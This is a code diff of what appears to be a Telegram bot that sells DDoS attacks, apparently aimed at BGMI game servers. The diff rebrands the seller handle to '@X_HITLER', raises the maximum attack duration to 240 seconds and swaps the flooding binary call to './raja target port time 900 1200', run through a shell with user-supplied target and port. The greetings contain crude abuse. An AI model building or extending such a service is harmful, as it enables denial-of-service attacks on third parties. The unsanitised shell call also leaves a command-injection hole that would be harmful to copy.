@@ -147,7 +147,7 @@ def add_user(message):
         else:
             response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add ."
     else:
-        response = "Mood ni hai abhi pelhe purchase kar isse:- @Mk_ddos."
+        response = "Mood ni hai abhi pelhe purchase kar isse:- @X_HITLER."
 
     bot.reply_to(message , response)
 
@@ -183,7 +183,7 @@ def remove_user(message):
             response = '''Please Specify A User ID to Remove. 
  Usage: /remove <userid>'''
     else:
-        response = "**Purchase karle :- @Mk_ddos** ."
+        response = "**Purchase karle :- @X_HITLER** ."
 
     bot.reply_to(message, response)
     
@@ -290,8 +290,8 @@ def handle_attack(message):
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
 
-            if time > 100:
-                response = "Error: Time interval must be less than 100"
+            if time > 240:
+                response = "Error: Time interval must be less than 240"
             else:
                 attack_running = True  # Set the attack  state to running
                 try:
@@ -300,7 +300,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack  process
-                    full_command = f"./soul {target} {port} {time} 30"
+                    full_command = f"./raja {target} {port} {time} {900} {1200}"
                     subprocess.run(full_command, shell=True)
 
                     response = " **attack  completed successfully feedback doo**."
@@ -351,7 +351,7 @@ def show_help(message):
 👀 To See Admin Commands:
 🤖 /admincmd : Shows All Admin Commands.
 
-Buy From :- @Mk_ddos
+Buy From :- @X_HITLER
 Official Channel :- 
 '''
     for handler in bot.message_handlers:
@@ -367,9 +367,9 @@ Official Channel :-
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''🔥 Monster ke LODE pe aapka swagat hai, {user_name}! Sabse acche se bgmi ki maa behen yahi hack karta hai. Kharidne ke liye Kira se sampark karein.
+    response = f'''🔥 HITLAR ke LODE pe aapka swagat hai, {user_name}! Sabse acche se bgmi ki maa behen yahi hack karta hai. Kharidne ke liye Kira se sampark karein.
 🤗Try To Run This Command : /help 
-💵BUY :-@Mk_ddos'''
+💵BUY :-@X_HITLER'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -379,7 +379,7 @@ def welcome_rules(message):
 
 1. Dont Run Too Many attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
-3. MAKE SURE YOU JOINED https://t.me/+M_0atJiJlhwzMmY1 OTHERWISE NOT WORK
+3. MAKE SURE YOU JOINED https://t.me/+r9JfnsU_w3gyNTQ9 OTHERWISE NOT WORK
 4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
     bot.reply_to(message, response)
 
